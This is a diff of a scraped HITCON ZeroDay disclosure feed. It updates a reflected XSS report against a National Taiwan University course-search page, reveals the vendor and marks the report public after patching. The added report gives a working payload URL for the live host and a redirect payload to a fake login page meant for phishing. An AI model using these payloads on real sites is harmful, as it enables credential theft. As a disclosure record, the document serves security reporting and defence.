@@ -3414,7 +3414,7 @@
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="eebeae9d9d99de9c8a" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="a9f9e9dadade99dbcd" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -3479,7 +3479,7 @@
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="401000333337703224">
+      <span class="__cf_email__" data-cfemail="7f2f3f0c0c084f0d1b">
        [email protected]
       </span>
      </a>
@@ -6172,7 +6172,7 @@
   </div>
  </section>
 </div>
-</description><pubDate>Sun, 13 Mar 2022 22:16:48 GMT</pubDate></item><item><title> 某單位  Reflected XSS</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00202</link><description><div class="container">
+</description><pubDate>Sun, 13 Mar 2022 22:16:48 GMT</pubDate></item><item><title>國立台灣大學 Reflected XSS</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00202</link><description><div class="container">
  <h2 class="always-not-there">
   Vulnerability Detail Report
  </h2>
@@ -6190,12 +6190,25 @@
       ZD-2022-00202
      </span>
     </li>
+    <li class="vendor">
+     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/12">
+      <i class="far fa-envelope">
+      </i>
+      發信
+     </a>
+     <span class="label">
+      Vendor:
+     </span>
+     <span class="value tx-overflow-ellipsis">
+      國立臺灣大學
+     </span>
+    </li>
     <li class="title">
      <span class="label">
       Title:
      </span>
      <span class="value">
-      某單位  Reflected XSS
+      國立台灣大學 Reflected XSS
      </span>
     </li>
     <li class="intro">
@@ -6218,10 +6231,10 @@
     目前狀態
    </h4>
    <div class="status-label col-status-200-tx">
-    確認已修補
+    公開
    </div>
    <div class="status-descr">
-    Last Update : 2022/03/22
+    Last Update : 2022/03/26
    </div>
    <ul class="zdui-status-timeline stat-tn-risk-low">
     <li class="">
@@ -6260,7 +6273,7 @@
       </span>
      </div>
     </li>
-    <li class="just-arrived">
+    <li class="">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -6269,7 +6282,7 @@
       </span>
      </div>
     </li>
-    <li class="not-arrived-yet">
+    <li class="just-arrived">
      <div class="stat-tn-node">
       <span class="stat-tn-date">
       </span>
@@ -6362,6 +6375,17 @@
       確認已修補 (由 鄉民 更新此狀態)
      </span>
     </li>
+    <li>
+     <span class="log-date">
+      2022/03/26 03:00:12
+     </span>
+     <span class="always-not-there">
+      :
+     </span>
+     <span class="log-status">
+      公開 (由 HITCON ZeroDay 平台自動更新)
+     </span>
+    </li>
    </ul>
   </div>
  </section>
@@ -6386,6 +6410,103 @@
    </ul>
   </div>
  </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   參考資料
+  </h3>
+  <div class="section-content url">
+   <div>
+    攻擊者可經由該漏洞竊取使用者身份，或進行掛碼、轉址等攻擊行為。
+    <br/>
+    <br/>
+    漏洞說明： OWASP - Cross-site Scripting (XSS)
+    <br/>
+    https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+    <br/>
+    <br/>
+    防護原則：
+    <br/>
+    https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
+    <br/>
+    <br/>
+    XSS 防禦繞過方式：
+    <br/>
+    https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+   </div>
+   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
+    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-url">
+  <h3 class="sec-title">
+   相關網址
+  </h3>
+  <div class="section-content url">
+   <div class="urls">
+    http://get.aca.ntu.edu.tw/getcdb/
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   敘述
+  </h3>
+  <div class="section-content zdui-md-content" id="detail">
+   <div>
+    <p>
+     搜尋欄能夠執行XSS注入,
+    </p>
+    <h2>
+     Reproduce
+    </h2>
+    <ol>
+     <li>
+      Pop an alert('XSS') =&gt;
+      <a href="http://get.aca.ntu.edu.tw/getcdb/gcou/search?query=%22+%3E%3Csvg+onload%3Dalert%28%27XSS%27%29%3E+%2F%2F">
+       http://get.aca.ntu.edu.tw/getcdb/gcou/search?query=%22+%3E%3Csvg+onload%3Dalert%28%27XSS%27%29%3E+%2F%2F
+      </a>
+     </li>
+    </ol>
+    <h2>
+     Affect
+    </h2>
+    <ol>
+     <li>
+      我能夠隨意注入假的連結/網頁內容，例如跳轉到假的登入頁，再配合釣魚信，就有機會盜走目標帳密
+     </li>
+    </ol>
+    <p>
+     Redirect example:
+    </p>
+    <pre><code>"&gt; &lt;svg onload=window.location.href='http://fake_ntu_login.php' &gt; //</code></pre>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   修補建議
+  </h3>
+  <div class="section-content zdui-md-content">
+   <p>
+    https://portswigger.net/web-security/cross-site-scripting/preventing
+   </p>
+  </div>
+ </section>
+ <section class="vul-detail-section">
+  <h3 class="sec-title">
+   擷圖
+  </h3>
+  <div class="section-content screenshot">
+   <ul>
+    <li>
+     <span>
+      <img src="/api/vulnerability/7365/attachments/42e2c9972a91733992e51713480d97b6" width="320"/>
+     </span>
+    </li>
+   </ul>
+  </div>
+ </section>
  <section class="vul-detail-section vu-d-cmnt">
   <h3 class="sec-title">
    留言討論
@@ -6398,6 +6519,25 @@
      <a href="/auth/login">
       登入後留言
      </a>
+    </div>
+   </div>
+  </div>
+ </section>
+ <section class="vul-detail-section vu-d-cmnt">
+  <h3 class="sec-title">
+   聯絡組織
+  </h3>
+  <div class="section-content">
+   <div class="zdui-comment-block">
+    <div class="input-comment">
+     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/12">
+      <i class="far fa-envelope">
+      </i>
+      發送私人訊息
+     </a>
+     <div class="remind-text">
+      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
+     </div>
     </div>
    </div>
   </div>
